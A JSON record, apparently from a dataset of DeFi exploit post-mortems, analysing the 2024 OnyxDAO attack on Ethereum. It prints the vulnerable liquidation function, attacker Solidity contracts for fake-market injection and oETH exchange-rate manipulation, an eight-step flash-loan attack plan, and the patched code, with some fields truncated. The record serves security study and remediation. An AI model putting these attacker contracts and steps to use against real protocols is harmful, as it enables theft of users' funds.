@@ -1,0 +1,52 @@
+{
+ "id": "2024__2024-09-26_OnyxDAO_UnverifiedInput_ETH",
+ "source_file": "2024/2024-09-26_OnyxDAO_UnverifiedInput_ETH.md",
+ "title": "OnyxDAO — Unvalidated Input Vulnerability Analysis (2024)",
+ "date": "2024-09-26",
+ "protocol": "OnyxDAO",
+ "chain": "Ethereum",
+ "loss_raw": "~$3,800,000 (4.1M VUSD, 7.35M XCN, 5K DAI, 0.23 WBTC, 50K USDT)",
+ "loss_usd": 3800000.0,
+ "root_cause": "Compound v2 precision loss (oETH exchange rate inflation via tiny mint/redeem cycles) combined with fake Market injection via unvalidated user input into NFTLiquidation.liquidateWithSingleRepay()",
+ "attack_tx": "0x4656...8729",
+ "vulnerable_contract": "NFTLiquidation 0xf10b...9002",
+ "classes": [
+  "arbitrary-call",
+  "nft"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable code: no input address validation\nfunction liquidateWithSingleRepay(\n    address payable borrower,\n    address oTokenCollateral,  // ❌ Not verified to be a protocol-registered market\n    address oTokenRepay,       // ❌ Attacker can inject arbitrary contract\n    uint256 repayAmount\n) external payable {\n    // Does not check if oTokenRepay is an actually registered market\n    // oTokenCollateral likewise allows arbitrary addresses\n    \n    address underlying = IOToken(oTokenRepay).underlying(); // Can return a fake underlying\n    \n    // Calls underlying.transferFrom() — always succeeds with a fake token\n    IERC20(underlying).transferFrom(msg.sender, address(this), repayAmount);\n    \n    // Calls oTokenRepay.transfer() — fake contract executes malicious logic via callback\n    IERC20(oTokenRepay).transfer(borrower, repayAmount); // ❌ Triggers arbitrary code execution\n    \n    // ...\n}",
+  "// ❌ Fake liquidation token contract deployed by attacker\ncontract Fake_oTokenRepay {\n    address fake_underlying;\n    address attackerC;\n\n    // Malicious logic that executes the moment NFTLiquidation calls transfer()\n    function transfer(address, uint256) external returns (bool) {\n        // ❌ Approve VUSD to oVUSD and execute real liquidation\n        IFS(VUSD).approve(oVUSD, type(uint256).max);\n        // ❌ Force-liquidate the attacker contract's (attackerC) ETH collateral\n        IFS(oVUSD).liquidateBorrow(attackerC, 1, oETH);\n        // ❌ Convert seized oETH to ETH\n        uint256 bal_oETH = IFS(oETH).balanceOf(address(this));\n        IFS(oETH).redeem(bal_oETH);\n        // ❌ Send ETH to attacker\n        payable(attackerC).transfer(address(this).balance);\n        return true;\n    }\n}",
+  "// ❌ Repeated mint/redeem for oETH exchange rate manipulation\ncontract AttackerC2 {\n    function attack() external {\n        uint256 x = 215_227_348 + 1; // Small ETH deposit\n        uint256 y = 330_454_691 + 10; // Small oETH redemption\n\n        IFS _oETH = IFS(oETH);\n        oETH.call{value: x}(\"\"); // Direct ETH transfer to increase cash\n\n        // ❌ 54 iterations: redeemUnderlying + small ETH deposit\n        // → Manipulate exchangeRate to induce a liquidatable state\n        for (uint256 i; i < 54; i++) {\n            _oETH.redeemUnderlying(y);\n            oETH.call{value: x}(\"\"); // Manipulate cash\n        }\n        _oETH.redeemUnderlying(y);\n        payable(address(msg.sender)).transfer(address(this).balance);\n    }\n}"
+ ],
+ "code_after": [
+  "// ✅ Fixed code: whitelist-based market validation added\nfunction liquidateWithSingleRepay(\n    address payable borrower,\n    address oTokenCollateral,\n    address oTokenRepay,\n    uint256 repayAmount\n) external payable {\n    // ✅ Must verify the market is registered in Unitroller\n    require(\n        IUnitroller(unitroller).isMarketListed(oTokenCollateral),\n        \"NFTLiquidation: oTokenCollateral is not a listed market\"\n    );\n    require(\n        IUnitroller(unitroller).isMarketListed(oTokenRepay),\n        \"NFTLiquidation: oTokenRepay is not a listed market\"\n    );\n    \n    // ✅ Remaining logic proceeds identically (applied only to validated markets)\n    address underlying = IOToken(oTokenRepay).underlying();\n    IERC20(underlying).transferFrom(msg.sender, address(this), repayAmount);\n    // ...\n}",
+  "// ✅ Fix: Unitroller whitelist-based validation\nfunction liquidateWithSingleRepay(\n    address payable borrower,\n    address oTokenCollateral,\n    address oTokenRepay,\n    uint256 repayAmount\n) external payable {\n    // ✅ Verify both parameters are registered markets\n    require(\n        IComptroller(unitroller).isMarketListed(oTokenCollateral),\n        \"NFTLiquidation: invalid collateral market\"\n    );\n    require(\n        IComptroller(unitroller).isMarketListed(oTokenRepay),\n        \"NFTLiquidation: invalid repay market\"\n    );\n    // Continue with existing logic\n}"
+ ],
+ "steps": [
+  "Step 1: Obtain Flash Loan",
+  "Step 2: ETH Conversion and oETH Minting",
+  "Convert 2,000 WETH → ETH",
+  "Step 3: Enter All Markets",
+  "Step 4: Multi-Market Borrowing (maximum borrow against collateral)",
+  "oXCN.borrow(getCash()) → Borrow all XCN → transfer to attacker",
+  "oDAI.borrow(getCash()) → Borrow all DAI → transfer to attacker",
+  "oBTC.borrow(getCash()) → Borrow all WBTC → transfer to attacker",
+  "oUSDT.borrow(getCash()) → Borrow all USDT → transfer to attacker",
+  "oVUSD.borrow(liq/1e12) → Borrow VUSD",
+  "Step 5: oETH Exchange Rate Manipulation (execute AttackerC2)",
+  "54 iterations: redeemUnderlying(y) + small direct ETH deposit",
+  "Manipulate oETH exchangeRate → AttackerC's position falls into liquidatable state",
+  "Step 6: Fake Market Liquidation Attack (core)",
+  "oVUSD.liquidateBorrow(AttackerC, 1, oETH) → obtain oETH collateral",
+  "oETH.redeem(full balance) → convert to ETH",
+  "Step 7: VUSD → WETH Swap",
+  "Swap 300B VUSD → WETH via Uniswap V3 Pool",
+  "Step 8: Flash Loan Repayment and Profit Realization",
+  "WETH.deposit(ETH) → convert to WETH"
+ ],
+ "other_code": [
+  "Step 1: Obtain Flash Loan\n  └── Flash loan of 2,000 WETH (~$5.2M) from Balancer Vault\n\nStep 2: ETH Conversion and oETH Minting\n  └── Convert 2,000 WETH → ETH\n  └── Mint oETH with 1,999.5 ETH (register as collateral)\n\nStep 3: Enter All Markets\n  └── Call Unitroller.enterMarkets(getAllMarkets())\n  └── Participate as collateral in all lending markets\n\nStep 4: Multi-Market Borrowing (maximum borrow against collateral)\n  └── oXCN.borrow(getCash()) → Borrow all XCN → transfer to attacker\n  └── oDAI.borrow(getCash()) → Borrow all DAI → transfer to attacker\n  └── oBTC.borrow(getCash()) → Borrow all WBTC → transfer to attacker\n  └── oUSDT.borrow(getCash()) → Borrow all USDT → transfer to attacker\n  └── Calculate remaining collateral headroom via getAccountLiquidity()\n  └── oVUSD.borrow(liq/1e12) → ",
+  "Attacker EOA (0x6809...F36B)\n        │\n        ▼\n┌─────────────────────────┐\n│  AttackerC (Main)       │\n│  0xa57e...8956          │\n└────────────┬────────────┘\n             │ ① flashLoan(2000 WETH)\n             ▼\n┌─────────────────────────┐\n│   Balancer Vault        │\n│   (Flash Loan Provider) │\n└────────────┬────────────┘\n             │ ② Transfer 2000 WETH\n             ▼\n┌─────────────────────────┐\n│  AttackerC              │──③ WETH→ETH, mint oETH\n│  (Collateral: oETH)     │──④ Enter all markets\n└────────────┬────────────┘\n             │ ⑤ Maximum borrow from each market\n             ▼\n┌────────────────────────────────────────┐\n│  oXCN / oDAI / oBTC / oUSDT / oVUSD   │\n│  (Collateral-backed multi-market borrow)│\n└────────────────────────────────────────┘\n             │ ⑥ Send 0.5 ETH t"
+ ]
+}
